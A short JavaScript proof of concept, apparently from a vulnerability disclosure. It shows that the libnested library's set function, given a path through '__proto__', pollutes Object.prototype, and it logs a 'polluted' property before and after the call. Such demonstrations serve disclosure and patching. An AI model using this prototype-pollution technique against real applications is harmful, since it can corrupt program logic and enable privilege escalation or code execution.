const libnested = require('./index'); 
console.log({}.polluted);
libnested.set({}, [ ['__proto__'], 'polluted' ], 'yes'); 
console.log({}.polluted);